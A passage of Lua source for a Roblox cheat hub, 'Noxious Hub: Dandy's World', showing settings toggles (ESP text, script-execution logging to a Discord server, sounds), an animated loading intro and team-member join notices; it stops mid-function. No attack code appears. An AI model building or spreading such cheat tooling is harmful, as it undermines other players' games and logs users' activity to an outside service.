		toggleButton.MouseButton1Click:Connect(function()
			isOn = not isOn
			toggleButton.Text = isOn and "On" or "Off"
			if toggleCallback then
				toggleCallback(isOn) -- Call the toggle callback function
			end

			-- Update config and save
			if title == "Toggle Script Logging" then
				config.ptlog = isOn
			elseif title == "Toggle Clear on FocusLost" then
				config.ptcleartextbox = isOn
			elseif title == "Toggle Simple ESP Text" then
				config.simpleesp = isOn
			end
			saveConfig()
		end)
	end

	-- Add RGB color picker (if enabled)
	if RGBcolor then
		-- Color frame
		local colorFrame = Instance.new("Frame")
		colorFrame.Size = UDim2.new(0, 30, 0, 30)
		colorFrame.Position = UDim2.new(1, -182, 0.5, -15) -- Right side
		colorFrame.BackgroundColor3 = defaultColor or noxious["default white color"] -- Use defaultColor if provided, else white
		colorFrame.BorderSizePixel = 1
		colorFrame.BorderColor3 = noxious["default white color"]
		colorFrame.Parent = frame

		-- Textbox for RGB input
		local textBox = Instance.new("TextBox")
		textBox.Size = UDim2.new(0, 120, 0, 30)
		textBox.Position = UDim2.new(1, -135, 0.5, -15) -- Right side
		textBox.PlaceholderText = "R, G, B"
		textBox.Font = Enum.Font.Nunito
		textBox.PlaceholderColor3 = noxious["default gray color"]
		textBox.TextSize = 20
		textBox.Text = defaultColor and string.format("%d, %d, %d", defaultColor.r * 255, defaultColor.g * 255, defaultColor.b * 255) or "255, 255, 255"
		textBox.TextColor3 = noxious["default white color"]
		textBox.BackgroundColor3 = noxious["default black color"] -- Dark gray
		textBox.BorderSizePixel = 1
		textBox.BorderColor3 = noxious["default white color"]
		textBox.Parent = frame
		textBox.ClipsDescendants = true
		textBox.ZIndex = 3

		-- Update color on Enter
		textBox.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local r, g, b = textBox.Text:match("(%d+), (%d+), (%d+)")
				if r and g and b then
					local color = Color3.new(r / 255, g / 255, b / 255)
					colorFrame.BackgroundColor3 = color
					if colorCallback then
						colorCallback(color) -- Call the color callback function
					end
				else
					notify("Invalid RGB format. Use R, G, B (e.g., 255, 0, 0)", 5, "error")
				end
			end
		end)
	end

	-- Add image ID textbox (if enabled)
	if imageid then
		local imageTextBox = Instance.new("TextBox")
		imageTextBox.Size = UDim2.new(0, 120, 0, 30)
		imageTextBox.Position = UDim2.new(1, -135, 0.5, -15) -- Right side
		imageTextBox.PlaceholderText = "Image ID"
		imageTextBox.Font = Enum.Font.Nunito
		imageTextBox.PlaceholderColor3 = noxious["default gray color"]
		imageTextBox.TextSize = 20
		imageTextBox.Text = defaultid or "" -- Set default ID if provided
		imageTextBox.TextColor3 = noxious["default white color"]
		imageTextBox.BackgroundColor3 = noxious["default black color"] -- Dark gray
		imageTextBox.BorderSizePixel = 1
		imageTextBox.BorderColor3 = noxious["default white color"]
		imageTextBox.Parent = frame
		imageTextBox.ClipsDescendants = true
		imageTextBox.ZIndex = 3

		-- Validate image ID on Enter
		imageTextBox.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local id = tonumber(imageTextBox.Text)
				if id and id > 0 then
					if imageCallback then
						imageCallback(id) -- Call the image callback function
					end
				else
					notify("Invalid Image ID. Please enter a valid positive number.", 5, "error")
				end
			end
		end)
	end

	-- Add audio ID textbox (if enabled)
	if audioid then
		local audioTextBox = Instance.new("TextBox")
		audioTextBox.Size = UDim2.new(0, 120, 0, 30)
		audioTextBox.Position = UDim2.new(1, -135, 0.5, -15) -- Right side
		audioTextBox.PlaceholderText = "Audio ID"
		audioTextBox.Font = Enum.Font.Nunito
		audioTextBox.PlaceholderColor3 = noxious["default gray color"]
		audioTextBox.TextSize = 20
		audioTextBox.Text = defaultid or "" -- Set default ID if provided
		audioTextBox.TextColor3 = noxious["default white color"]
		audioTextBox.BackgroundColor3 = noxious["default black color"] -- Dark gray
		audioTextBox.BorderSizePixel = 1
		audioTextBox.BorderColor3 = noxious["default white color"]
		audioTextBox.Parent = frame
		audioTextBox.ClipsDescendants = true
		audioTextBox.ZIndex = 3

		-- Validate audio ID on Enter
		audioTextBox.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local id = tonumber(audioTextBox.Text)
				if id and id > 0 then
					if audioCallback then
						audioCallback(id) -- Call the audio callback function
					end

					-- Update config and save
					if title == "Notification Sound" then
						config.notificationSound = tostring(id)
					elseif title == "Warning Notification Sound" then
						config.warningSound = tostring(id)
					elseif title == "Error Notification Sound" then
						config.errorSound = tostring(id)
					elseif title == "Click Sound" then
						config.clickSound = tostring(id)
					end
					saveConfig()
				else
					notify("Invalid Audio ID. Please enter a valid positive number.", 5, "error")
				end
			end
		end)
	end

	-- Add theme textbox (if enabled)
	if themetextbox then
		local themeTextBox = Instance.new("TextBox")
		themeTextBox.Size = UDim2.new(0, 120, 0, 30)
		themeTextBox.Position = UDim2.new(1, -135, 0.5, -15) -- Right side
		themeTextBox.PlaceholderText = "Theme Name"
		themeTextBox.Font = Enum.Font.Nunito
		themeTextBox.PlaceholderColor3 = noxious["default gray color"]
		themeTextBox.TextSize = 20
		themeTextBox.Text = defaulttheme or "Default" -- Set default theme if provided
		themeTextBox.TextColor3 = noxious["default white color"]
		themeTextBox.BackgroundColor3 = noxious["default black color"] -- Dark gray
		themeTextBox.BorderSizePixel = 1
		themeTextBox.BorderColor3 = noxious["default white color"]
		themeTextBox.Parent = frame
		themeTextBox.ClipsDescendants = true
		themeTextBox.ZIndex = 3

		-- Validate theme name on Enter
		themeTextBox.FocusLost:Connect(function(enterPressed)
			if enterPressed then
				local theme = themeTextBox.Text
				if theme and theme ~= "" then
					if themeCallback then
						themeCallback(theme) -- Call the theme callback function
					end
				else
					notify("Invalid Theme Name. Please enter a valid theme.", 5, "error")
				end
			end
		end)
	end

	-- Adjust scrolling frame's CanvasSize
	noxious["script settings holder"].CanvasSize = UDim2.new(0, 0, 0.019, #noxious["script settings holder"]:GetChildren() * 70)
end

-- Add settings frames with loaded config values
addScriptSettingFrame(
	"Toggle Script Logging", 
	"Toggles whether you want your script execution to be logged in the Discord server.", 
	true, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	false, -- audioid
	"0", -- defaultid
	config.ptlog and "On" or "Off", -- defaultToggleState from config
	false, -- themetextbox
	nil, -- defaulttheme
	function(isOn) -- toggleCallback
		ptlog = isOn -- Update the ptlog variable based on the toggle state
		config.ptlog = isOn
		saveConfig()
	end,
	nil, -- colorCallback
	nil, -- imageCallback
	nil, -- audioCallback
	nil -- themeCallback
)

addScriptSettingFrame(
	"Toggle Simple ESP Text", 
	"Toggles whether you want the ESP to have detailed text.", 
	true, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	false, -- audioid
	"0", -- defaultid
	config.simpleesp and "On" or "Off", -- defaultToggleState from config
	false, -- themetextbox
	nil, -- defaulttheme
	function(isOn) -- toggleCallback
		simpleesp = isOn -- Update the ptlog variable based on the toggle state
		config.simpleesp = isOn
		saveConfig()
	end,
	nil, -- colorCallback
	nil, -- imageCallback
	nil, -- audioCallback
	nil -- themeCallback
)

addScriptSettingFrame(
	"Toggle Clear on FocusLost", 
	"Basically makes it so it toggles the text clearing for when you click on the command bar.", 
	true, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	false, -- audioid
	nil, -- defaultid
	config.ptcleartextbox and "On" or "Off", -- defaultToggleState from config
	false, -- themetextbox
	nil, -- defaulttheme
	function(isOn) -- toggleCallback
		ptcleartextbox = isOn -- Update the ptcleartextbox variable based on the toggle state
		config.ptcleartextbox = isOn
		saveConfig()
		updclrtxt() -- Update the command bar's ClearTextOnFocus property
	end,
	nil, -- colorCallback
	nil, -- imageCallback
	nil, -- audioCallback
	nil -- themeCallback
)

addScriptSettingFrame(
	"Notification Sound", 
	"Sets the notification sound to the specified audio ID.", 
	false, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	true, -- audioid
	config.notificationSound, -- defaultid from config
	nil, -- defaultToggleState
	false, -- themetextbox
	nil, -- defaulttheme
	nil, -- toggleCallback
	nil, -- colorCallback
	nil, -- imageCallback
	function(audioId) -- audioCallback
		noxious["notification sound"] = "rbxassetid://" .. audioId
		config.notificationSound = tostring(audioId)
		saveConfig()
	end,
	nil -- themeCallback
)

addScriptSettingFrame(
	"Warning Notification Sound", 
	"Sets the warning notification sound to the specified audio ID.", 
	false, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	true, -- audioid
	config.warningSound, -- defaultid from config
	nil, -- defaultToggleState
	false, -- themetextbox
	nil, -- defaulttheme
	nil, -- toggleCallback
	nil, -- colorCallback
	nil, -- imageCallback
	function(audioId) -- audioCallback
		noxious["warning sound"] = "rbxassetid://" .. audioId
		config.warningSound = tostring(audioId)
		saveConfig()
	end,
	nil -- themeCallback
)

addScriptSettingFrame(
	"Error Notification Sound", 
	"Sets the error notification sound to the specified audio ID.", 
	false, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	true, -- audioid
	config.errorSound, -- defaultid from config
	nil, -- defaultToggleState
	false, -- themetextbox
	nil, -- defaulttheme
	nil, -- toggleCallback
	nil, -- colorCallback
	nil, -- imageCallback
	function(audioId) -- audioCallback
		noxious["error sound"] = "rbxassetid://" .. audioId
		config.errorSound = tostring(audioId)
		saveConfig()
	end,
	nil -- themeCallback
)

addScriptSettingFrame(
	"Click Sound", 
	"Sets the click sound to the specified audio ID.", 
	false, -- onofftoggle
	false, -- RGBcolor
	nil, -- id
	nil, -- defaultColor
	false, -- imageid
	true, -- audioid
	config.clickSound, -- defaultid from config
	nil, -- defaultToggleState
	false, -- themetextbox
	nil, -- defaulttheme
	nil, -- toggleCallback
	nil, -- colorCallback
	nil, -- imageCallback
	function(audioId) -- audioCallback
		noxious["click sound"].SoundId = "rbxassetid://" .. audioId
		config.clickSound = tostring(audioId)
		saveConfig()
	end,
	nil -- themeCallback
)

if game.PlaceId ~= noxious["test game"] then
	noxious["notification sound"] = "rbxassetid://" .. config.notificationSound
	noxious["warning sound"] = "rbxassetid://" .. config.warningSound
	noxious["error sound"] = "rbxassetid://" .. config.errorSound
	noxious["click sound"].SoundId = "rbxassetid://" .. config.clickSound
end

-------------------------------------------------------------------------------------------------------------------------------

noxious["scroll bar holder 3"] = Instance.new"Frame"
noxious["scroll bar holder 3"].Name = "RightScrollFrame"
noxious["scroll bar holder 3"].Size = UDim2.new(0, 10.9, 0, 242.00000000000003)
noxious["scroll bar holder 3"].BackgroundColor3 = noxious["default black color"]
noxious["scroll bar holder 3"].BorderSizePixel = 0
noxious["scroll bar holder 3"].Position = UDim2.new(0, 584, 0, 48)
noxious["scroll bar holder 3"].BorderColor3 = noxious["default white color"]
noxious["scroll bar holder 3"].BorderSizePixel = 1
noxious["scroll bar holder 3"].ZIndex = 1
noxious["scroll bar holder 3"].Parent = mainframe2
noxious["scroll bar holder 3"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

noxious["settings button"].MouseButton1Click:Connect(
	function()
		mainframe.Visible = false
		mainframe2.Visible = true
		lastframeseen = "mainframe2"
		noxious["scroll bar holder 3"].Visible = true
		noxious["click sound"]:Play()
	end
)

noxious["main button"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
	end
)

noxious["settings button 2"].MouseButton1Click:Connect(
	function()
		noxious["click sound"]:Play()
	end
)

noxious["main button 2"].MouseButton1Click:Connect(
	function()
		mainframe.Visible = true
		mainframe2.Visible = false
		lastframeseen = "mainframe"
		noxious["scroll bar holder 3"].Visible = false
		noxious["click sound"]:Play()
	end
)

-------------------------------------------------------------------------------------------------------------------------------

noxious["top frame 2"].ZIndex = 18
noxious["top frame profile picture 2"].ZIndex = 18
noxious["top frame text 2"].ZIndex = 18
noxious["top frame subtext 2"].ZIndex = 18
noxious["reposition interface button 2"].ZIndex = 18
noxious["hide interface button 2"].ZIndex = 18
noxious["settings button"].ZIndex = 18
noxious["settings button 2"].ZIndex = 18
noxious["main button"].ZIndex = 18
noxious["main button 2"].ZIndex = 18

noxious["bottom frame 2"].ZIndex = 18
noxious["bottom frame team icon 2"].ZIndex = 18
noxious["bottom frame title 2"].ZIndex = 18
noxious["bottom frame subtitle 2"].ZIndex = 18

noxious["scroll bar holder 3"].ZIndex = 15
noxious["settings holder"].ZIndex = 18
noxious["script settings holder"].ZIndex = 18

noxious["tabs frame 2"].ZIndex = 18
noxious["configuration tab"].ZIndex = 20
noxious["script settings tab"].ZIndex = 19

-------------------------------------------------------------------------------------------------------------------------------

noxious["toggle interface visibility button"].ZIndex = 50
noxious["tivb border"].ZIndex = 49

noxious["tabs frame"].ZIndex = 18
noxious["credits tab"].ZIndex = 19
noxious["information tab"].ZIndex = 19
noxious["changelogs tab"].ZIndex = 19
noxious["commands tab"].ZIndex = 19
noxious["scroll bar holder 2"].ZIndex = 17

noxious["tooltip main frame"].ZIndex = 18
noxious["tooltip command name"].ZIndex= 19
noxious["tooltip command description"].ZIndex= 19

noxious["noxious info button"].ZIndex = 19
noxious["workspace.info button"].ZIndex = 19
noxious["developer note button"].ZIndex = 19
noxious["reload noxious button"].ZIndex = 19
noxious["back to commands button"].ZIndex = 19

noxious["command bar"].ZIndex = 19
noxious["execute button"].ZIndex = 21
noxious["hide"].ZIndex = 20

noxious["top frame"].ZIndex = 18
noxious["top frame profile picture"].ZIndex = 18
noxious["top frame text"].ZIndex = 18
noxious["top frame subtext"].ZIndex = 18
noxious["reposition interface button"].ZIndex = 18
noxious["hide interface button"].ZIndex = 18
noxious["settings button"].ZIndex = 18

noxious["dandy's world workspace.info holder"].ZIndex = 18
noxious["changelogs holder"].ZIndex = 18
noxious["information holder"].ZIndex = 18
noxious["credits holder"].ZIndex = 18

noxious["bottom frame"].ZIndex = 18
noxious["bottom frame team icon"].ZIndex = 18
noxious["bottom frame title"].ZIndex = 18
noxious["bottom frame subtitle"].ZIndex = 18

noxious["command button holder"].ZIndex = 16
noxious["scroll bar holder"].ZIndex = 15

------------------------------------------------------------------------------------------------------------------------------

function intro()
	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y

	local frameWidth = 90
	local frameHeight = 90
	local centerX = (screenWidth - frameWidth) / 2
	local centerY = (screenHeight - frameHeight) / 2 - 58

	local screenGui = Instance.new("ScreenGui")
	screenGui.Parent = noxious["noxious screen gui"]

	local function createAndTweenImage(imageId, startPosition, endPosition, startRotation, endRotation, duration)
		local image = Instance.new("ImageLabel")
		image.Size = UDim2.new(0, frameWidth, 0, frameHeight)
		image.Position = startPosition
		image.Image = imageId
		image.BackgroundTransparency = 1
		image.ImageTransparency = 1
		image.Rotation = startRotation
		image.Parent = screenGui

		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)

		local positionTween = game:GetService("TweenService"):Create(image, tweenInfo, {Position = endPosition})
		local transparencyTween = game:GetService("TweenService"):Create(image, tweenInfo, {ImageTransparency = 0}) -- Fade to fully visible
		local rotationTween = game:GetService("TweenService"):Create(image, tweenInfo, {Rotation = endRotation}) -- Rotate to the final orientation

		positionTween:Play()
		rotationTween:Play()
		wait(0.3) -- Start fading after 0.3 seconds
		transparencyTween:Play()

		-- Wait for all tweens to complete
		spawn(function()
			positionTween.Completed:Wait()
			rotationTween.Completed:Wait()
			transparencyTween.Completed:Wait()
		end)
		wait(2)

		image:Destroy()
	end

	-- Create and animate the four images
	local duration = 2
	spawn(function() 
		createAndTweenImage(
			"rbxassetid://105319046533888",
			UDim2.new(0.5, -frameWidth / 2, 0, -frameHeight), -- Top of screen
			UDim2.new(0, centerX, 0, centerY),
			math.random(-180, 180), -- Randomized initial rotation
			0, -- Final rotation (normal orientation)
			duration
		)
	end)
	spawn(function() 
		createAndTweenImage(
			"rbxassetid://129058777635468",
			UDim2.new(0.5, -frameWidth / 2, 1, 0), -- Bottom of screen
			UDim2.new(0, centerX, 0, centerY),
			math.random(-180, 180), -- Randomized initial rotation
			0, -- Final rotation (normal orientation)
			duration
		)
	end)
	spawn(function() 
		createAndTweenImage(
			"rbxassetid://99947170158417",
			UDim2.new(0, -frameWidth, 0.5, -frameHeight / 2), -- Left of screen
			UDim2.new(0, centerX, 0, centerY),
			math.random(-180, 180), -- Randomized initial rotation
			0, -- Final rotation (normal orientation)
			duration
		)
	end)
	spawn(function() 
		createAndTweenImage(
			"rbxassetid://95135112375096",
			UDim2.new(1, 0, 0.5, -frameHeight / 2), -- Right of screen
			UDim2.new(0, centerX, 0, centerY),
			math.random(-180, 180), -- Randomized initial rotation
			0, -- Final rotation (normal orientation)
			duration
		)
	end)

	-- Continue with the main image loading after all animations
	wait(duration)
	wait(0.2)

	-- Change ImageLabel to ImageButton to support click events
	local imageLabel = Instance.new"ImageButton"	
	imageLabel.Parent = screenGui
	imageLabel.Size = UDim2.new(0, frameWidth, 0, frameHeight)
	imageLabel.Position = UDim2.new(0, centerX, 0, centerY)
	imageLabel.Image = "rbxassetid://100574547642033"
	imageLabel.BackgroundTransparency = 1 -- Optional: Makes the background transparent
	imageLabel.BorderSizePixel = 0
	imageLabel.ImageTransparency = 1 -- Start with image fully transparent
	imageLabel.ZIndex = 9999

	-- Change ImageLabel to ImageButton to support click events
	local imageLabel2 = Instance.new"ImageLabel"	
	imageLabel2.Parent = screenGui
	imageLabel2.Size = UDim2.new(0, frameWidth, 0, frameHeight)
	imageLabel2.Position = UDim2.new(0, centerX, 0, centerY)
	imageLabel2.Image = "rbxassetid://100574547642033"
	imageLabel2.BackgroundTransparency = 1 -- Optional: Makes the background transparent
	imageLabel2.BorderSizePixel = 0
	imageLabel2.ImageTransparency = 0 -- Start with image fully transparent
	imageLabel2.ZIndex = 9999

	-- Create TextLabels
	local textLabel = Instance.new"TextLabel"	
	textLabel.Parent = screenGui
	textLabel.Size = UDim2.new(0, frameWidth, 0, 40)
	textLabel.Position = UDim2.new(0, centerX, 0, centerY - 30)
	textLabel.Text = "Welcome, " .. game.Players.LocalPlayer.DisplayName .. " (@" .. game.Players.LocalPlayer.Name .. ")!"
	textLabel.TextStrokeTransparency = 1
	textLabel.TextStrokeColor3 = Color3.new(1,1,1)
	textLabel.Font = Enum.Font.Nunito
	textLabel.BackgroundTransparency = 1
	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel.TextSize = 21.6
	textLabel.TextTransparency = 1
	textLabel.ZIndex = 9999

	spawn(function()
		if iscosmo(noxious["local player"].Name) then
			textLabel.Text = "Welcome, Cosmo (@cosmo)!"
		end

		if isunable(noxious["local player"].Name) then
			textLabel.Text = "Welcome, unable (@unable)!"
		end

		if isace(noxious["local player"].Name) then
			textLabel.Text = "Welcome, Ace (@ace)!"
		end

		if undercover(noxious["local player"].Name) then
			textLabel.Text = "Welcome, ncts (@ncts)!"
		end
	end)

	-- Create a table of random messages
	local messages = {
		"Thank you all so much for "..noxious["uses"].." uses!",
		"If you're in a run and some of the commands / scripts don't work, try executing them AFTER floor 1.",
		"Team Noxious was founded by unable in 2022.",
		"We started scripting Noxious Hub: Dandy's World in September 14th, 2024.",
		"Ace is unable's little sister. We recruited her into the team because she wanted to.",
		"Think you've discovered a bug? Report it to @Noxious on ScriptBlox.",
		"Team Noxious consists of 11 people. Plethora is unable's friend, but he isn't a part of the team.",
		"I HATE TWISTED SPROUT I HATE TWISTED SPROUT I HATE TWISTED SPROUT I HATE TWISTED SPROUT",
		"Waiting for planets to align...",
		"There is a 1 in 100,000,000 chance of this message appearing on your screen.",
		"That '1 in 100,000,000' chance message is a lie.",
		"Hiding more secrets...",
		"This seems like a good place to hide a secret...",
		"Did you hear something?",
		"Dextrocities and Colton was here",
		"Thank you for choosing us!",
		"The Noxious logo was made in Geometry Dash.",
		"Noxious Hub started off as a simple grey rectangle with buttons on top of your screen.",
		"Ace tends to terrorize people with the script with jumpscares. If she joins your server, prepare your ears!",
		"So, what's up?",
		"At first, if you don't succeed, find another way.",
		"The record for most players / toons sitting on top of each other is 7. Can you beat that?",
		"Adding more bugs, hold on.",
		"Do people even read these?",
		"You get a special notification if a Noxious Team Member joins / is in your server.",
		"Sempiterna sit beatae, trinitati gloria. Aequa patri filioque, par decus paraclito.",
		"Faceless shrimpo, or any other Dandy's World creepypasta, isn't real. Or are they?",
		"Who said that!?",
		"Remember: Forward 5 Backward 5 Left 4 Right 4 Jump",
	}

	-- Select a random message
	local randomMessage = messages[math.random(1, #messages)]

	-- Create the TextLabel
	local funfact = Instance.new"TextLabel"	
	funfact.Parent = screenGui
	funfact.Size = UDim2.new(0, frameWidth, 0, 40)
	funfact.Position = UDim2.new(0, centerX, 0, centerY - 15)
	funfact.Text = randomMessage
	funfact.TextStrokeTransparency = 1
	funfact.TextStrokeColor3 = Color3.new(1, 1, 1)
	funfact.Font = Enum.Font.Nunito
	funfact.BackgroundTransparency = 1
	funfact.TextColor3 = Color3.fromRGB(255, 255, 255)
	funfact.TextSize = 14
	funfact.TextTransparency = 1
	funfact.ZIndex = 9999

	-- Function to cycle through messages without repeating the last one
	local function cycleMessages()
		local lastMessage 		
		while true do
			-- Create a list of messages excluding the last displayed message
			local availableMessages = {}
			for _, message in ipairs(messages) do
				if message ~= lastMessage then
					table.insert(availableMessages, message)
				end
			end

			-- Select a random message from the available messages
			local randomMessage = availableMessages[math.random(1, #availableMessages)]
			-- Update the TextLabel and store the last message
			funfact.Text = randomMessage
			lastMessage = randomMessage

			-- Wait for 5 seconds before updating again
			wait(3)
		end
	end

	-- Start cycling messages
	spawn(cycleMessages)

	local textLabel2 = Instance.new"TextLabel"	
	textLabel2.Parent = screenGui
	textLabel2.Size = UDim2.new(0, frameWidth, 0, 40)
	textLabel2.Position = UDim2.new(0, centerX, 0, centerY + 65)
	textLabel2.Text = "Noxious Hub: Dandy's World - Loading Assets..."
	textLabel2.TextStrokeTransparency = 1
	textLabel2.TextStrokeColor3 = Color3.new(1,1,1)
	textLabel2.Font = Enum.Font.Nunito
	textLabel2.BackgroundTransparency = 1
	textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel2.TextSize = 21.6
	textLabel2.TextTransparency = 1
	textLabel2.ZIndex = 9999

	-- Create TextLabels
	local skip = Instance.new"TextLabel"	
	skip.Parent = screenGui
	skip.Size = UDim2.new(0, frameWidth, 0, 40)
	skip.Position = UDim2.new(0, centerX, 0, centerY + 80)
	skip.Text = "Click on the icon or press Q to skip the loading sequence."
	skip.TextStrokeTransparency = 1
	skip.TextStrokeColor3 = Color3.new(1,1,1)
	skip.Font = Enum.Font.Nunito
	skip.BackgroundTransparency = 1
	skip.TextColor3 = Color3.fromRGB(255, 255, 255)
	skip.TextSize = 14
	skip.TextTransparency = 1
	skip.ZIndex = 9999

	local textLabel3 = Instance.new"TextLabel"	
	textLabel3.Parent = screenGui
	textLabel3.Size = UDim2.new(0, frameWidth, 0, 40)
	textLabel3.Position = UDim2.new(0, centerX, 0, centerY + 25)
	textLabel3.Text = "< ----------------------------                    ---------------------------- >"
	textLabel3.TextStrokeTransparency = 1
	textLabel3.TextStrokeColor3 = Color3.new(1,1,1)
	textLabel3.Font = Enum.Font.Nunito
	textLabel3.BackgroundTransparency = 1
	textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
	textLabel3.TextSize = 21.6
	textLabel3.TextTransparency = 1
	textLabel3.ZIndex = 0
	textLabel3.ZIndex = 9999

	local skipRequested = false
	local canSkip = false -- Player cannot skip initially
	local moveButtonCalled = false -- Flag to ensure movebutton() is called only once

	local function fadeIn()	
		local tweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
		local imageTween = noxious["tween service"]:Create(imageLabel, tweenInfo, {ImageTransparency = 1})
		local imageTween2 = noxious["tween service"]:Create(imageLabel2, tweenInfo, {ImageTransparency = 0})
		local textTween1 = noxious["tween service"]:Create(textLabel, tweenInfo, {TextTransparency = 0})
		local textTween2 = noxious["tween service"]:Create(textLabel2, tweenInfo, {TextTransparency = 0})
		local textTween3 = noxious["tween service"]:Create(textLabel3, tweenInfo, {TextTransparency = 0})
		local textTween4 = noxious["tween service"]:Create(funfact, tweenInfo, {TextTransparency = 0.4})
		local textTween5 = noxious["tween service"]:Create(skip, tweenInfo, {TextTransparency = 0.4})

		-- Play all tweens and set the flag after completion
		imageTween:Play()
		imageTween2:Play()
		textTween1:Play()
		textTween2:Play()
		textTween3:Play()
		textTween4:Play()
		textTween5:Play()

		-- Wait for the tweens to finish before allowing skipping
		imageTween.Completed:Wait()
		canSkip = true -- Allow skipping after fade-in completes
	end

	-- Fade out function
	local function fadeOut()
		spawn(function()
			imageLabel:Destroy()
		end)
		local tweenService = game:GetService"TweenService"		
		local tweenInfo = TweenInfo.new(0.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
		tweenService:Create(imageLabel2, tweenInfo, {ImageTransparency = 1}):Play()
		tweenService:Create(textLabel, tweenInfo, {TextTransparency = 1}):Play()
		tweenService:Create(textLabel2, tweenInfo, {TextTransparency = 1}):Play()
		tweenService:Create(textLabel3, tweenInfo, {TextTransparency = 1}):Play()
		tweenService:Create(funfact, tweenInfo, {TextTransparency = 1}):Play()
		tweenService:Create(skip, tweenInfo, {TextTransparency = 1}):Play()
		wait(0.8)
		imageLabel2:Destroy()
		textLabel:Destroy()
		textLabel2:Destroy()
		textLabel3:Destroy()
		funfact:Destroy()
		skip:Destroy()
	end

	-- Function to handle the fade-out and movebutton call
	local function handleSkipOrComplete()
		if not moveButtonCalled then
			moveButtonCalled = true -- Set the flag to true
			spawn(function() tweenmainframe() wait(1) movebutton() end)
			fadeOut()
			noxious["loaded"] = true
		end
	end

	-- Start spinning the image asynchronously
	spawn(function()
		while not skipRequested do
			local tweenInfo = TweenInfo.new(1.2, Enum.EasingStyle.Back, Enum.EasingDirection.InOut, -1)
			local goal = {Rotation = imageLabel.Rotation + 180}
			local tween = game:GetService"TweenService":Create(imageLabel, tweenInfo, goal)
			local tween2 = game:GetService"TweenService":Create(imageLabel2, tweenInfo, goal)
			tween:Play()
			tween2:Play()
			tween.Completed:Wait()
			tween2.Completed:Wait()
		end
	end)

	local textLocked = false -- Flag to lock text changes

	-- Function to set textLabel2's text with lock protection
	local function setTextLabel2Text(newText)
		if textLocked then return end -- Prevent changes if text is locked

		textLabel2.Text = newText
		if newText == "Noxious Hub: Dandy's World - Successfully loaded." then
			textLocked = true -- Lock the text once it reaches the final value
		end
	end

	fadeIn()

	-- Connect key press to skip functionality
	game:GetService"UserInputService".InputBegan:Connect(function(input, gameProcessed)
		if gameProcessed then return end -- Ignore if the input is already processed by the game
		if input.KeyCode == Enum.KeyCode.Q then
			skipRequested = true
			setTextLabel2Text"Noxious Hub: Dandy's World - Loading sequence skipped."			
			handleSkipOrComplete()
			spawn(handleSkipOrComplete) -- Run handleSkipOrComplete asynchronously
		end
	end)

	-- Function to ensure script waits until the correct message is displayed
	local function waitForCompletion()
		local targetMessages = {
			["Noxious Hub: Dandy's World - Successfully loaded."] = true,
			["Noxious Hub: Dandy's World - Loading sequence skipped."] = true
		}

		repeat
			wait() -- Wait until textLabel2.Text matches one of the target messages
		until targetMessages[textLabel2.Text]
	end

	local fadeOutFinished = false

	-- Function to handle skipping
	local function handleSkip()
		if not fadeOutFinished then
			skipRequested = true
			setTextLabel2Text"Noxious Hub: Dandy's World - Loading sequence skipped."
			spawn(function() fadeOut() end)
			spawn(handleSkipOrComplete) -- Run handleSkipOrComplete asynchronously
		end
	end

	local soundPlayed = false -- Add a flag to track if the sound has been played

	-- Connect ImageButton's MouseButton1Click event to handleSkip
	imageLabel.MouseButton1Click:Connect(function()
		if not soundPlayed then
			noxious["click sound"]:Play()
			soundPlayed = true -- Set the flag to true after playing the sound
		end
		handleSkip()
	end)

	spawn(function()
		fadeIn()

		local messages = {
			"Noxious Hub: Dandy's World - Loading UI...",
			"Noxious Hub: Dandy's World - Loading Commands...",
			"Noxious Hub: Dandy's World - Loading Scripts...",
			"Noxious Hub: Dandy's World - Checking for Character...",
			"Noxious Hub: Dandy's World - Checking Environment...",
			"Noxious Hub: Dandy's World - Checking Place ID...",
			"Noxious Hub: Dandy's World - Validating User...",
		}

		wait(3)

		for _, message in ipairs(messages) do
			if skipRequested then break end
			setTextLabel2Text(message)
			wait(math.random(0.7, 2.4))
		end

		-- Set the final message based on whether skip was requested
		if skipRequested then
			setTextLabel2Text"Noxious Hub: Dandy's World - Loading sequence skipped."		
		else
			setTextLabel2Text"Noxious Hub: Dandy's World - Successfully loaded."		
		end

		fadeOut()
		spawn(function() fadeOut() end)
		spawn(handleSkipOrComplete) -- Run handleSkipOrComplete asynchronously
	end)

	-- Script below waits for the condition
	waitForCompletion()

	-------------------------------------------------------------------------------------------------------------------------------

	wait(0)

	-------------------------------------------------------------------------------------------------------------------------------

	if premiumuser(noxious["local player"].Name) then
		spawn(function() notify("Thank you for being a Noxious Premium Member!", 5) end)
	end

	if istester(noxious["local player"].Name) then
		spawn(function()
			notify("Welcome, tester.", 5)
			wait(1.5)
			notify("You are currently using an unreleased version of Noxious Hub: Dandy's World.", 5, "warning")
		end)
	end

	local unablenotified = {}
	local acenotified = {}
	local qwelvernotified = {}
	local devnotified = {}

	-- devs
	local function devnotify(player, isJoining)
		for _, scriptdeveloper in ipairs(noxious["admins"]) do
			if player.Name == scriptdeveloper and not devnotified[player.UserId] then
				if isJoining then
					notify("A Noxious Team Member joined your server.", 5, "tmishere")
				else
					notify("A Noxious Team Member is in your server.", 5, "tmishere")
				end
				devnotified[player.UserId] = true
			end
		end
	end

	-- When a player joins
	noxious["players"].PlayerAdded:Connect(function(player)
